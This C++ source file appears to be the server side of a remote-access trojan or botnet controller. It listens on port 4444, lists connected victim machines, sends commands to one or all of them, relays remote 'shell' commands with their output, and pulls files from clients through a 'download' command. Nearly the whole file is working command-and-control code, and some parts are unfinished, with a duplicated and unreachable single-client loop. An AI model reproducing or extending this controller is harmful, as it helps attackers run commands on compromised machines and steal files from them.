#include <iostream>
#include <winsock2.h>
#include <string>
#include <ws2tcpip.h>
#include<vector>
#include<fstream>
#include<thread>    
#include<mutex>
#pragma comment(lib, "ws2_32.lib") // Link with the ws2_32.lib library

struct ClientInfo {
    SOCKET socket;
    std::string ipAddress;
    int port;
    bool isConnected;
};
std::vector<ClientInfo> clients;
std::mutex clientsMutex;
std::string firstWord(std::string sentence)
{
    size_t spacePos = sentence.find(' ');
    std::string firstWord;
    if (spacePos != std::string::npos) {
        firstWord = sentence.substr(0, spacePos);
    }
    else {
        firstWord = sentence;
    }
    return firstWord;
}

// Function to receive a file, -1 means error, 0 means OK
int fileRecv(const char* filePath, SOCKET transferSocket) {
    std::ofstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Could not create file." << std::endl;
        return -1;
    }

    int fileSize;
    if (recv(transferSocket, (char*)&fileSize, sizeof(int), 0) <= 0) {
        std::cerr << "Error receiving file size." << std::endl;
        file.close();
        return -1;
    }

    char buffer[1024];
    int bytesReceived = 0;
    while (bytesReceived < fileSize) {
        int result = recv(transferSocket, buffer, sizeof(buffer), 0);
        if (result <= 0) {
            std::cerr << "Error receiving file data." << std::endl;
            file.close();
            return -1;
        }
        file.write(buffer, result);
        bytesReceived += result;
    }

    file.close();
    std::cout << "File '" << filePath << "' received successfully." << std::endl;
    return 0;
}

// fuckyou@192.168.1.10--> 192.168.1.10
std::string extractIPFromMessage(const std::string& message) {
    size_t atPos = message.find('@');
    if (atPos != std::string::npos && atPos < message.length() - 1) {
        return message.substr(atPos + 1);
    }
    return "";
}

//fuckyou@192.168.1.12--> fuckyou
std::string extractMessageContent(const std::string& message) {
    size_t atPos = message.find('@');
    if (atPos != std::string::npos) {
        return message.substr(0, atPos);
    }
    return message;
}

void HandleClient(ClientInfo* clientInfo) {
    std::cout << "[Thread] Handling client: " << clientInfo->ipAddress << std::endl;

    while (clientInfo->isConnected) {
        // This thread just maintains the connection
        // Actual sending is done from main thread
        Sleep(100);
    }

    closesocket(clientInfo->socket);
    std::cout << "[Thread] Client disconnected: " << clientInfo->ipAddress << std::endl;
}

//function to handle individual client communication
bool SendToClient(const std::string& targetIP, const std::string& message) {
    std::lock_guard<std::mutex> lock(clientsMutex);

    for (auto& client : clients) {
        if (client.ipAddress == targetIP && client.isConnected) {
            int messageSize = message.length();
            int networkSize = htonl(messageSize);

            if (send(client.socket, (char*)&networkSize, sizeof(int), 0) == SOCKET_ERROR) {
                std::cerr << "Send size failed to " << targetIP << std::endl;
                client.isConnected = false;
                return false;
            }

            int totalSent = 0;
            while (totalSent < messageSize) {
                int sent = send(client.socket, message.c_str() + totalSent, messageSize - totalSent, 0);
                if (sent == SOCKET_ERROR) {
                    std::cerr << "Send failed to " << targetIP << std::endl;
                    client.isConnected = false;
                    return false;
                }
                totalSent += sent;
            }

            std::cout << "Message sent successfully to " << targetIP << std::endl;
            return true;
        }
    }

    std::cerr << "Client with IP " << targetIP << " not found or not connected!" << std::endl;
    return false;
}

//broadcast functionality
void BroadcastToAllClients(const std::string& message) {
    std::lock_guard<std::mutex> lock(clientsMutex);

    for (auto& client : clients) {
        if (client.isConnected) {
            int messageSize = message.length();
            int networkSize = htonl(messageSize);

            if (send(client.socket, (char*)&networkSize, sizeof(int), 0) == SOCKET_ERROR) {
                std::cerr << "Broadcast send size failed to " << client.ipAddress << std::endl;
                client.isConnected = false;
                continue;
            }

            int totalSent = 0;
            while (totalSent < messageSize) {
                int sent = send(client.socket, message.c_str() + totalSent, messageSize - totalSent, 0);
                if (sent == SOCKET_ERROR) {
                    std::cerr << "Broadcast send failed to " << client.ipAddress << std::endl;
                    client.isConnected = false;
                    break;
                }
                totalSent += sent;
            }
        }
    }

    std::cout << "Message broadcasted to all clients." << std::endl;
}

//shown all alive Hosts
void ShowAliveHosts() {
    std::lock_guard<std::mutex> lock(clientsMutex);

    std::cout << "\n========== Connected Clients ==========\n";
    if (clients.empty()) {
        std::cout << "No clients connected.\n";
    }
    else {
        int count = 1;
        for (const auto& client : clients) {
            if (client.isConnected) {
                std::cout << count++ << ". IP: " << client.ipAddress
                    << " | Port: " << client.port << " | Status: ALIVE\n";
            }
        }
    }
    std::cout << "=======================================\n\n";
}

//recv info from certain IP
bool ReceiveFromClient(const std::string& targetIP) {
    std::lock_guard<std::mutex> lock(clientsMutex);

    for (auto& client : clients) {
        if (client.ipAddress == targetIP && client.isConnected) {
            int networkSize = 0;
            int bytesReceived = recv(client.socket, (char*)&networkSize, sizeof(int), 0);
            if (bytesReceived <= 0) {
                std::cerr << "Connection closed by client or failed to receive message size." << std::endl;
                client.isConnected = false;
                return false;
            }

            int messageSize = ntohl(networkSize);

            if (messageSize <= 0 || messageSize > 1048576) {
                std::cerr << "Invalid message size: " << messageSize << std::endl;
                return false;
            }

            char* buffer = new char[messageSize + 1];
            memset(buffer, 0, messageSize + 1);

            int totalReceived = 0;
            while (totalReceived < messageSize) {
                bytesReceived = recv(client.socket, buffer + totalReceived, messageSize - totalReceived, 0);
                if (bytesReceived <= 0) {
                    std::cerr << "Failed to receive message data." << std::endl;
                    delete[] buffer;
                    client.isConnected = false;
                    return false;
                }
                totalReceived += bytesReceived;
            }

            std::string receivedMessage(buffer);
            std::cout << "\n[Response from " << targetIP << "]:\n" << receivedMessage << std::endl;
            delete[] buffer;
            return true;
        }
    }

    return false;
}

//Thread to accept new clients continuously
void AcceptClientsThread(SOCKET listenSocket) {
    while (true) {
        sockaddr_in clientAddr = {};
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);

        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed." << std::endl;
            continue;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        int clientPort = ntohs(clientAddr.sin_port);

        ClientInfo newClient;
        newClient.socket = clientSocket;
        newClient.ipAddress = std::string(clientIP);
        newClient.port = clientPort;
        newClient.isConnected = true;

        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients.push_back(newClient);
        }

        std::cout << "\n[NEW CLIENT CONNECTED]" << std::endl;
        std::cout << "Client IP: " << clientIP << std::endl;
        std::cout << "Client Port: " << clientPort << std::endl;
        std::cout << "Total clients: " << clients.size() << std::endl;

        // Start a thread to handle this client
        std::thread clientThread(HandleClient, &clients.back());
        clientThread.detach();
    }
}
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Error creating socket." << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY; // Listen on any available network interface
    serverAddr.sin_port = htons(4444); // Use port 4444

    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed." << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed." << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    std::cout << "=================" << std::endl;
    std::cout << "Server listening on port 4444..." << std::endl;
    std::cout << "=================" << std::endl;

    sockaddr_in clientAddr = {};
    std::thread acceptThread(AcceptClientsThread, listenSocket);
    acceptThread.detach();
    std::cout << "Commands:" << std::endl;
    std::cout << "  - showAliveHost : Show all connected clients" << std::endl;
    std::cout << "  - message@IP : Send message to specific IP (e.g., 'Hello@192.168.1.11')" << std::endl;
    std::cout << "  - broadcast:message : Send message to all clients" << std::endl;
    std::cout << "  - Quit : Exit server\n" << std::endl;
    int clientAddrSize = sizeof(clientAddr);
    SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrSize);

    while (true) {
        std::string message;
        std::cout << "\nEnter command: ";
        std::getline(std::cin, message);

        // Command: showAliveHost
        if (message == "showAliveHost") {
            ShowAliveHosts();
            continue;
        }

        // Command: Quit
        if (message == "Quit") {
            std::cout << "Shutting down server..." << std::endl;
            BroadcastToAllClients("Quit");
            break;
        }

        // Command: broadcast:message
        if (message.substr(0, 10) == "broadcast:") {
            std::string broadcastMsg = message.substr(10);
            BroadcastToAllClients(broadcastMsg);
            continue;
        }

        // Command: message@IP
        std::string targetIP = extractIPFromMessage(message);
        if (!targetIP.empty()) {
            std::string actualMessage = extractMessageContent(message);

            if (SendToClient(targetIP, actualMessage)) {
                // Check if it's a shell command that expects response
                if (firstWord(actualMessage) == "shell" || actualMessage == "ls") {
                    std::cout << "Waiting for response from " << targetIP << "...\n";
                    ReceiveFromClient(targetIP);
                }
            }
        }
        else {
            std::cout << "Invalid format! Use: message@IP or showAliveHost or broadcast:message" << std::endl;
        }
    }
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Accept failed." << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
    int clientPort = ntohs(clientAddr.sin_port);

    std::cout << "Client connected." << std::endl;
    std::cout << "Client IP: " << clientIP << std::endl;
    std::cout << "Client Port: " << clientPort << std::endl;


    while (true) {
        std::string message;
        std::cout << "\nEnter a message to send to the client (type 'Quit' to exit): ";
        std::getline(std::cin, message);

        // Send the size of the message first, so the client knows how much to receive
        int messageSize = message.length();
        int networkSize = htonl(messageSize); // Convert to network byte order

        if (send(clientSocket, (char*)&networkSize, sizeof(int), 0) == SOCKET_ERROR) {
            std::cerr << "Send size failed. Client may have disconnected." << std::endl;
            break; // Exit loop on error
        }

        // Send the actual message
        int totalSent = 0;
        while (totalSent < messageSize) {
            int sent = send(clientSocket, message.c_str() + totalSent, messageSize - totalSent, 0);
            if (sent == SOCKET_ERROR) {
                std::cerr << "Send failed. Client may have disconnected." << std::endl;
                break;
            }
            totalSent += sent;
        }

        if (totalSent < messageSize) {
            break; // Exit if send was incomplete
        }

        std::cout << "Message sent successfully." << std::endl;

        // Check if user wants to quit
        if (message == "Quit") {
            std::cout << "Quit command sent. Closing connection..." << std::endl;
            break; // Exit the loop
        }
        if (firstWord(message)=="shell")
        {
            //pending working
            int networkSize=0;
            int bytesReceived = recv(clientSocket, (char*)&networkSize, sizeof(int), 0);
            if (bytesReceived <= 0) {
                std::cerr << "Connection closed by server or failed to receive message size." << std::endl;
                break;
            }

            int messageSize = ntohl(networkSize);

            // Validate message size to prevent excessive allocation
            if (messageSize <= 0 || messageSize > 1048576) { // Max 1MB
                std::cerr << "Invalid message size: " << messageSize << std::endl;
                break;
            }

            // Receive the actual message
            char* buffer = new char[messageSize + 1];
            memset(buffer, 0, messageSize + 1);

            int totalReceived = 0;
            while (totalReceived < messageSize) {
                bytesReceived = recv(clientSocket, buffer + totalReceived, messageSize - totalReceived, 0);
                if (bytesReceived <= 0) {
                    std::cerr << "Failed to receive message data." << std::endl;
                    delete[] buffer;
                    closesocket(clientSocket);
                    WSACleanup();
                    return 1;
                }
                totalReceived += bytesReceived;
            }

            std::string receivedMessage(buffer);
            std::cout << "\nReceived message:\n " << receivedMessage << std::endl;
        }
        if (firstWord(message) == "download") //download C:\freed\c.txt  some syntax alike to this
        {
            //pending
            // Receive the file name
            char filenameBuffer[256] = { 0 };
            recv(clientSocket, filenameBuffer, sizeof(filenameBuffer) - 1, 0);
            std::cout << "Receiving file: " << filenameBuffer << std::endl;

            // Call the file transfer function
            const short int RESULT=fileRecv(filenameBuffer, clientSocket);
            if (RESULT == 0)
            {
                std::cout << "file Received successful!" << std::endl;
            }
            if (RESULT == -1)
            {
                std::cerr << "file Received error!" << std::endl;
            }
        }
    }

    closesocket(clientSocket);
    closesocket(listenSocket);
    WSACleanup();
    return 0;
}
